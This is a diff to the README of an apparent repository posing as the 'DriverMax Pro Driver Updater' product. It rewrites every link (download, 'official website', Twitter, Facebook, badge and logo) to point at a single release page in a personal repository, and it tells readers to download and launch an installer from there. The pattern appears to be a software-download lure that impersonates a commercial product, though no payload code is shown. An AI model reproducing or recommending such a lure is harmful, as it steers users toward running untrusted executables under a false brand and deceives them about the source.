@@ -22,7 +22,7 @@ Welcome to the official repository of **DriverMax Pro Driver Updater** - the ult
 
 ## Installation 🛠️
 
-To get started with **DriverMax Pro Driver Updater**, you can download the latest release by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, launch the installer and follow the on-screen instructions to set up the software on your system.
+To get started with **DriverMax Pro Driver Updater**, you can download the latest release by clicking [here](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0). Once downloaded, launch the installer and follow the on-screen instructions to set up the software on your system.
 
 ## Usage 🚗
 
@@ -30,9 +30,9 @@ Once **DriverMax Pro Driver Updater** is installed, simply launch the applicatio
 
 ## Support 🤝
 
-If you encounter any issues or have any questions about **DriverMax Pro Driver Updater**, please feel free to visit our official [website](https://www.drivermaxpro.com) for more information and support. You can also check the "Releases" section of this repository for any updates or patches.
+If you encounter any issues or have any questions about **DriverMax Pro Driver Updater**, please feel free to visit our official [website](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0) for more information and support. You can also check the "Releases" section of this repository for any updates or patches.
 
-[![Download DriverMax Pro](https://img.shields.io/badge/Download-DriverMax_Pro-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download DriverMax Pro](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0)](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0)
 
 ## Get Started 🚀
 
@@ -42,9 +42,9 @@ Boost your PC's performance and ensure all your device drivers are up-to-date wi
 
 Follow us on social media for the latest updates and news:
 
-- Twitter: [@DriverMaxPro](https://twitter.com/DriverMaxPro)
-- Facebook: [DriverMax Pro](https://www.facebook.com/DriverMax-Pro-105831698437568)
+- Twitter: [@DriverMaxPro](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0)
+- Facebook: [DriverMax Pro](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0)
 
 Let's optimize your PC together with **DriverMax Pro Driver Updater**! 💻🔧
 
-![DriverMax Pro Logo](https://example.com/drivermaxpro_logo.png)
+![DriverMax Pro Logo](https://github.com/pranavheerekar/DriverMax-Pro-Driver-Updater/releases/tag/v1.0)
